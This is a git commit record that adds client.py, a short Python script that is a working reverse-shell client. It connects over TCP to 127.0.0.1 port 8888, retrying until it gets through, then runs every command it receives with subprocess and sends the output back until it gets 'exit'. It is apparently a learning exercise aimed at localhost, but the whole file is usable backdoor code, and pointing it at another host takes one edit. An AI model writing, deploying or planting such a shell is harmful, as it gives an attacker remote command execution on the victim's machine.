25c7d2c1b55aa7e2b3e7f8507f5976428ea2870c
Nipun Negi <100460166+nipunnegi2@users.noreply.github.com>
2023-10-24 03:20:44 -0400

    Add files via upload

---
+++ client.py
@@ -0,0 +1,24 @@
+import socket 
+import subprocess
+
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)    #ipv4 , tcp protocol
+print("Connecting......")
+while True:
+    try: 
+        s.connect(("127.0.0.1",8888))
+        break
+    except ConnectionRefusedError:
+        pass
+
+
+print("Connected")
+
+while True: 
+    cmd=(s.recv(1024)).decode()    #IT WILL PRINT IN  STRING
+    if cmd=="exit":
+        break
+    output=subprocess.getoutput(cmd)
+    s.send(output.encode())
+
+ 
+s.close()
